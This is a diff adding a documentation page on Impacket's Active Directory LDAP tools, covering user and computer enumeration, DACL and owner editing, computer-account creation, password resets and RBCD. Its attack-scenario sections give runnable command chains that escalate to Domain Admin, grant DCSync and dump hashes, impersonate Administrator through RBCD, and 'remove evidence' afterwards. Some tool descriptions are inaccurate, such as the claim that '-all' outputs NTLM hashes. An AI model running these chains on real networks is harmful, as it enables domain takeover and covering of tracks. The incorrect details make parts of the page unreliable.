@@ -1,0 +1,579 @@
+---
+title: "LDAP Operations & Active Directory"
+description: "Enumerate and manipulate Active Directory via LDAP"
+---
+
+Impacket provides powerful tools for interacting with Active Directory through LDAP, enabling enumeration, modification, and exploitation of AD objects and permissions.
+
+## Enumeration Tools
+
+### GetADUsers.py
+
+Enumerate Active Directory user accounts.
+
+<Tabs>
+  <Tab title="Basic Enumeration">
+    ```bash
+    # List all users
+    GetADUsers.py DOMAIN/user:password@DC_IP
+    
+    # With NTLM hash
+    GetADUsers.py DOMAIN/user@DC -hashes LMHASH:NTHASH
+    
+    # Kerberos authentication
+    GetADUsers.py DOMAIN/user@DC -k -no-pass -dc-ip DC_IP
+    ```
+  </Tab>
+  <Tab title="Specific Users">
+    ```bash
+    # Get specific user
+    GetADUsers.py DOMAIN/user:pass@DC -user Administrator
+    
+    # Get all users in format: samaccountname:ntlmhash
+    GetADUsers.py DOMAIN/user:pass@DC -all
+    ```
+  </Tab>
+  <Tab title="Filtering">
+    ```bash
+    # Filter by attributes
+    GetADUsers.py DOMAIN/user:pass@DC -ldapfilter "(adminCount=1)"
+    
+    # Domain Admins only
+    GetADUsers.py DOMAIN/user:pass@DC -ldapfilter "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)"
+    ```
+  </Tab>
+</Tabs>
+
+### Example Output
+
+```bash
+$ GetADUsers.py CORP/jdoe:P@ssw0rd@10.0.0.1 -all
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+Name                 Email                   PasswordLastSet           LastLogon
+-------------------  ----------------------  ------------------------  ------------------------
+Administrator                                2023-01-15 10:30:22       2024-01-10 09:15:33
+Guest                                        <never>                   <never>
+jdoe                 jdoe@corp.local         2023-12-01 14:22:11       2024-01-15 08:45:22
+sql_svc              sql@corp.local          2023-01-20 11:00:00       <never>
+```
+
+### GetADComputers.py
+
+Enumerate computer accounts in Active Directory.
+
+```bash
+# List all computers
+GetADComputers.py DOMAIN/user:password@DC_IP
+
+# With specific attributes
+GetADComputers.py DOMAIN/user:pass@DC -computerName WIN10-01
+
+# Filter for domain controllers
+GetADComputers.py DOMAIN/user:pass@DC -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
+```
+
+## Permission & ACL Tools
+
+### dacledit.py
+
+Read and modify Discretionary Access Control Lists (DACLs) on AD objects.
+
+<Tabs>
+  <Tab title="Read ACLs">
+    ```bash
+    # Read DACL on object
+    dacledit.py DOMAIN/user:password@DC -action read -target-dn "CN=User,CN=Users,DC=domain,DC=com"
+    
+    # Read specific principal's rights
+    dacledit.py DOMAIN/user:pass@DC -action read -target "TargetUser" -principal "AttackerUser"
+    ```
+  </Tab>
+  <Tab title="Write ACLs">
+    ```bash
+    # Grant WriteDACL permission
+    dacledit.py DOMAIN/user:pass@DC -action write -rights WriteDacl \
+      -principal AttackerUser -target TargetUser
+    
+    # Grant FullControl
+    dacledit.py DOMAIN/user:pass@DC -action write -rights FullControl \
+      -principal AttackerUser -target-dn "CN=Domain Admins,CN=Users,DC=domain,DC=com"
+    
+    # Grant WriteMembers (add to group)
+    dacledit.py DOMAIN/user:pass@DC -action write -rights WriteMembers \
+      -principal AttackerUser -target "Domain Admins"
+    ```
+  </Tab>
+  <Tab title="Remove ACLs">
+    ```bash
+    # Remove specific ACE
+    dacledit.py DOMAIN/user:pass@DC -action remove -rights FullControl \
+      -principal AttackerUser -target TargetUser
+    
+    # Remove all ACEs for principal
+    dacledit.py DOMAIN/user:pass@DC -action remove -principal AttackerUser \
+      -target-dn "CN=Target,CN=Users,DC=domain,DC=com"
+    ```
+  </Tab>
+  <Tab title="Extended Rights">
+    ```bash
+    # Grant DCSync rights (Replication)
+    dacledit.py DOMAIN/user:pass@DC -action write \
+      -rights DCSync -principal AttackerUser -target-dn "DC=domain,DC=com"
+    
+    # Grant password reset rights
+    dacledit.py DOMAIN/user:pass@DC -action write \
+      -rights ResetPassword -principal AttackerUser -target TargetUser
+    ```
+  </Tab>
+</Tabs>
+
+### Example DACL Attack Chain
+
+```bash
+# 1. Grant WriteDACL to ourselves
+dacledit.py CORP/attacker:pass@dc -action write -rights WriteDacl \
+  -principal attacker -target TargetUser
+
+# 2. Grant ResetPassword (now that we have WriteDACL)
+dacledit.py CORP/attacker:pass@dc -action write -rights ResetPassword \
+  -principal attacker -target TargetUser
+
+# 3. Change the target's password
+changepasswd.py CORP/TargetUser:OldPass@dc -newpass NewPass123! \
+  -altuser attacker -althash :ATTACKER_HASH
+
+# 4. Use compromised account
+psexec.py CORP/TargetUser:NewPass123!@target
+```
+
+### owneredit.py
+
+Modify object ownership in Active Directory.
+
+```bash
+# Read current owner
+owneredit.py DOMAIN/user:pass@DC -action read -target-dn "CN=User,CN=Users,DC=domain,DC=com"
+
+# Change owner (requires SeRestorePrivilege or ownership)
+owneredit.py DOMAIN/user:pass@DC -action write -new-owner AttackerUser \
+  -target-dn "CN=TargetUser,CN=Users,DC=domain,DC=com"
+
+# Change owner by SID
+owneredit.py DOMAIN/user:pass@DC -action write -new-owner-sid S-1-5-21-... \
+  -target-dn "CN=TargetUser,CN=Users,DC=domain,DC=com"
+```
+
+## Account & Object Manipulation
+
+### addcomputer.py
+
+Add or remove computer accounts (covered in Kerberos section, but relevant here).
+
+<Tabs>
+  <Tab title="Add Computer (SAMR)">
+    ```bash
+    # Add via SAMR over SMB
+    addcomputer.py DOMAIN/user:password@DC -computer-name EVILPC$ \
+      -computer-pass P@ssw0rd123!
+    
+    # With hash
+    addcomputer.py DOMAIN/user@DC -hashes :NTHASH -computer-name EVILPC$ \
+      -computer-pass P@ss
+    ```
+  </Tab>
+  <Tab title="Add Computer (LDAPS)">
+    ```bash
+    # Add via LDAPS (recommended)
+    addcomputer.py DOMAIN/user:password@DC -method LDAPS \
+      -computer-name EVILPC$ -computer-pass P@ssw0rd123!
+    
+    # Specify computer group
+    addcomputer.py DOMAIN/user:pass@DC -method LDAPS -computer-name EVILPC$ \
+      -computer-pass P@ss -computer-group "CN=Computers,DC=domain,DC=com"
+    ```
+  </Tab>
+  <Tab title="Delete Computer">
+    ```bash
+    # Delete computer account
+    addcomputer.py DOMAIN/user:password@DC -computer-name EVILPC$ -delete
+    
+    # Clean up after attack
+    addcomputer.py DOMAIN/user@DC -hashes :HASH -computer-name EVILPC$ -delete
+    ```
+  </Tab>
+</Tabs>
+
+### changepasswd.py
+
+Change user passwords via multiple methods.
+
+<Tabs>
+  <Tab title="Kerberos (Set Password)">
+    ```bash
+    # Change password with Kerberos (current password required)
+    changepasswd.py DOMAIN/user:OldPassword@DC -newpass NewPassword123!
+    
+    # With different user (requires permissions)
+    changepasswd.py DOMAIN/targetuser:OldPass@DC -newpass NewPass \
+      -altuser attacker -altpass AttackerPass
+    ```
+  </Tab>
+  <Tab title="LDAP/LDAPS (Reset)">
+    ```bash
+    # Reset password via LDAP (requires reset permissions)
+    changepasswd.py DOMAIN/user@DC -reset -newpass NewPassword! \
+      -altuser admin -altpass AdminPass
+    
+    # Reset via LDAPS (encrypted)
+    changepasswd.py DOMAIN/targetuser@DC -reset -newpass NewPass! \
+      -altuser admin -althash :ADMIN_HASH
+    ```
+  </Tab>
+  <Tab title="SAMR (Reset)">
+    ```bash
+    # Reset via SAMR over RPC
+    changepasswd.py DOMAIN/targetuser@DC -reset -newpass NewPass! \
+      -altuser admin -altpass AdminPass
+    ```
+  </Tab>
+</Tabs>
+
+## Delegation & Privilege Tools
+
+### findDelegation.py
+
+Identify delegation configurations (unconstrained, constrained, RBCD).
+
+```bash
+# Find all delegation
+findDelegation.py DOMAIN/user:password@DC_IP
+
+# With hash
+findDelegation.py DOMAIN/user@DC -hashes LMHASH:NTHASH
+```
+
+### Example Output
+
+```bash
+$ findDelegation.py CORP/user:pass@10.0.0.1
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+[*] Searching for delegation...
+
+AccountName         AccountType  DelegationType                Services
+------------------  -----------  ----------------------------  ----------------------
+WEB-SERVER$         Computer     Unconstrained                 
+SQL-SERVER$         Computer     Constrained                   MSSQLSvc/sql.corp.local
+APP-SERVER$         Computer     Resource-Based Constrained    (see msDS-ATOABO)
+service_account     User         Constrained w/ Protocol       HTTP/web.corp.local
+```
+
+### rbcd.py
+
+Configure Resource-Based Constrained Delegation.
+
+<Tabs>
+  <Tab title="Read Configuration">
+    ```bash
+    # Read current RBCD settings
+    rbcd.py DOMAIN/user:password@DC -delegate-to TARGET$ -action read
+    
+    # Show who can delegate to target
+    rbcd.py DOMAIN/user:pass@DC -delegate-to TARGET$ -action read
+    ```
+  </Tab>
+  <Tab title="Write Configuration">
+    ```bash
+    # Allow ATTACKER$ to impersonate to TARGET$
+    rbcd.py DOMAIN/user:password@DC -delegate-from ATTACKER$ \
+      -delegate-to TARGET$ -action write
+    
+    # With hash
+    rbcd.py DOMAIN/user@DC -hashes :HASH -delegate-from EVIL$ \
+      -delegate-to VICTIM$ -action write
+    ```
+  </Tab>
+  <Tab title="Remove Configuration">
+    ```bash
+    # Remove RBCD
+    rbcd.py DOMAIN/user:password@DC -delegate-from ATTACKER$ \
+      -delegate-to TARGET$ -action remove
+    
+    # Clean up after attack
+    rbcd.py DOMAIN/user@DC -hashes :HASH -delegate-from EVIL$ \
+      -delegate-to VICTIM$ -action remove
+    ```
+  </Tab>
+</Tabs>
+
+## Information Gathering
+
+### lookupsid.py
+
+Enumerate users and groups by brute-forcing SIDs.
+
+```bash
+# Enumerate domain users via SID lookup
+lookupsid.py DOMAIN/user:password@DC_IP
+
+# Works with any user account (including guest if enabled)
+lookupsid.py DOMAIN/guest:@DC_IP
+
+# Maximum RID to check
+lookupsid.py DOMAIN/user:pass@DC -max-rid 5000
+```
+
+### Example Output
+
+```bash
+$ lookupsid.py CORP/user:pass@10.0.0.1
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+[*] Domain SID is: S-1-5-21-1234567890-1234567890-1234567890
+500: CORP\Administrator (SidTypeUser)
+501: CORP\Guest (SidTypeUser)
+502: CORP\krbtgt (SidTypeUser)
+512: CORP\Domain Admins (SidTypeGroup)
+513: CORP\Domain Users (SidTypeGroup)
+514: CORP\Domain Guests (SidTypeGroup)
+515: CORP\Domain Computers (SidTypeGroup)
+516: CORP\Domain Controllers (SidTypeGroup)
+...
+1001: CORP\jdoe (SidTypeUser)
+1002: CORP\sql_svc (SidTypeUser)
+```
+
+### netview.py
+
+Enumerate logged-on users and sessions across the domain.
+
+```bash
+# Enumerate sessions on all domain computers
+netview.py DOMAIN/user:password@DC_IP
+
+# Target specific host
+netview.py DOMAIN/user:pass -target TARGET-PC
+
+# Include groups in enumeration
+netview.py DOMAIN/user:pass@DC -groupname "Domain Admins"
+```
+
+### CheckLDAPStatus.py
+
+Check LDAP/LDAPS configuration and signing requirements.
+
+```bash
+# Check LDAP configuration
+CheckLDAPStatus.py DOMAIN/user:password@DC_IP
+
+# Anonymous check (no credentials)
+CheckLDAPStatus.py @DC_IP
+```
+
+### DumpNTLMInfo.py
+
+Dump NTLM authentication information from domain controller.
+
+```bash
+# Get NTLM info
+DumpNTLMInfo.py @DC_IP
+
+# Authenticated
+DumpNTLMInfo.py DOMAIN/user:password@DC_IP
+```
+
+## GPO & SYSVOL Tools
+
+### Get-GPPPassword.py
+
+Extract Group Policy Preferences passwords from SYSVOL (covered in credential dumping).
+
+```bash
+# Search for GPP passwords in SYSVOL
+Get-GPPPassword.py DOMAIN/user:password@DC_IP
+
+# Search specific policy
+Get-GPPPassword.py DOMAIN/user:pass@DC -xmlfile Groups.xml
+```
+
+### GetLAPSPassword.py
+
+Retrieve LAPS passwords (also covered in credential dumping).
+
+```bash
+# Get LAPS password for computer
+GetLAPSPassword.py DOMAIN/user:password@DC -computer WORKSTATION$
+
+# Get all LAPS passwords
+GetLAPSPassword.py DOMAIN/user:password@DC
+```
+
+## Service & RPC Tools
+
+### samrdump.py
+
+Dump user information via SAMR protocol.
+
+```bash
+# Enumerate users via SAMR
+samrdump.py DOMAIN/user:password@target
+
+# With hash
+samrdump.py DOMAIN/user@target -hashes LMHASH:NTHASH
+```
+
+### rpcdump.py
+
+Enumerate RPC endpoints.
+
+```bash
+# List RPC endpoints
+rpcdump.py DOMAIN/user:password@target
+
+# Specific port
+rpcdump.py @target -port 135
+
+# String binding
+rpcdump.py DOMAIN/user:pass@target -stringbinding ncacn_ip_tcp:target
+```
+
+### rpcmap.py
+
+Scan and map RPC endpoints.
+
+```bash
+# Map RPC interfaces
+rpcmap.py ncacn_ip_tcp:target
+
+# Brute force RPC endpoints
+rpcmap.py -brute-opnums ncacn_ip_tcp:target
+```
+
+## Attack Scenarios
+
+<Tabs>
+  <Tab title="ACL Abuse for DA">
+    ```bash
+    # Scenario: User has WriteDACL on Domain Admins group
+    
+    # 1. Grant yourself WriteMembers on Domain Admins
+    dacledit.py CORP/attacker:pass@dc -action write -rights WriteMembers \
+      -principal attacker -target "Domain Admins"
+    
+    # 2. Add yourself to Domain Admins (via net.py or Windows)
+    net.py CORP/attacker:pass@dc group "Domain Admins" attacker /add
+    
+    # 3. Verify membership
+    GetADUsers.py CORP/attacker:pass@dc -user attacker
+    
+    # 4. Now you're DA - dump domain
+    secretsdump.py CORP/attacker:pass@dc -just-dc-ntlm
+    ```
+  </Tab>
+  <Tab title="DCSync via ACL">
+    ```bash
+    # Scenario: Grant DCSync rights to compromised user
+    
+    # 1. Grant replication rights (requires WriteDACL on domain root)
+    dacledit.py CORP/admin:pass@dc -action write -rights DCSync \
+      -principal lowpriv -target-dn "DC=corp,DC=local"
+    
+    # 2. DCSync as low-privileged user
+    secretsdump.py CORP/lowpriv:pass@dc -just-dc-ntlm
+    
+    # 3. Clean up (remove evidence)
+    dacledit.py CORP/admin:pass@dc -action remove -rights DCSync \
+      -principal lowpriv -target-dn "DC=corp,DC=local"
+    ```
+  </Tab>
+  <Tab title="RBCD Full Chain">
+    ```bash
+    # Scenario: Computer account quota > 0, WriteDACL on target
+    
+    # 1. Add attacker computer
+    addcomputer.py CORP/user:pass@dc -computer-name EVIL$ -computer-pass P@ss
+    
+    # 2. Configure RBCD
+    rbcd.py CORP/user:pass@dc -delegate-from EVIL$ -delegate-to TARGET$ -action write
+    
+    # 3. Get TGT for our computer
+    getTGT.py CORP/EVIL$:P@ss -dc-ip 10.0.0.1
+    
+    # 4. Impersonate admin via S4U2Self/S4U2Proxy
+    export KRB5CCNAME=EVIL\$.ccache
+    getST.py CORP/EVIL$ -spn cifs/TARGET.corp.local -impersonate Administrator -k -no-pass
+    
+    # 5. Access target as admin
+    export KRB5CCNAME=Administrator.ccache
+    psexec.py CORP/Administrator@TARGET.corp.local -k -no-pass
+    
+    # 6. Clean up
+    rbcd.py CORP/user:pass@dc -delegate-from EVIL$ -delegate-to TARGET$ -action remove
+    addcomputer.py CORP/user:pass@dc -computer-name EVIL$ -delete
+    ```
+  </Tab>
+</Tabs>
+
+## LDAP Query Examples
+
+Useful LDAP filters for enumeration:
+
+<AccordionGroup>
+  <Accordion title="User Queries">
+    ```bash
+    # All enabled users
+    GetADUsers.py domain/user:pass@dc -ldapfilter "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
+    
+    # Users with adminCount=1 (protected accounts)
+    GetADUsers.py domain/user:pass@dc -ldapfilter "(adminCount=1)"
+    
+    # Users with SPN (kerberoastable)
+    GetADUsers.py domain/user:pass@dc -ldapfilter "(&(servicePrincipalName=*)(objectCategory=user))"
+    
+    # Users with "Do not require preauth"
+    GetADUsers.py domain/user:pass@dc -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
+    
+    # Users with password never expires
+    GetADUsers.py domain/user:pass@dc -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=65536)"
+    ```
+  </Accordion>
+  <Accordion title="Group Queries">
+    ```bash
+    # Domain Admins
+    -ldapfilter "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)"
+    
+    # Enterprise Admins
+    -ldapfilter "(memberOf=CN=Enterprise Admins,CN=Users,DC=domain,DC=com)"
+    
+    # All privileged groups
+    -ldapfilter "(adminCount=1)"
+    ```
+  </Accordion>
+  <Accordion title="Computer Queries">
+    ```bash
+    # Domain Controllers
+    GetADComputers.py domain/user:pass@dc -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
+    
+    # Computers with unconstrained delegation
+    GetADComputers.py domain/user:pass@dc -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+    
+    # Servers (likely)
+    GetADComputers.py domain/user:pass@dc -ldapfilter "(operatingSystem=*Server*)"
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Kerberos Attacks" icon="shield-halved" href="/examples/kerberos-attacks">
+    Exploit delegation and Kerberos configurations
+  </Card>
+  <Card title="Credential Dumping" icon="key" href="/examples/credential-dumping">
+    Extract credentials after gaining access
+  </Card>
+  <Card title="Remote Execution" icon="terminal" href="/examples/remote-execution">
+    Execute commands on enumerated systems
+  </Card>
+</CardGroup>
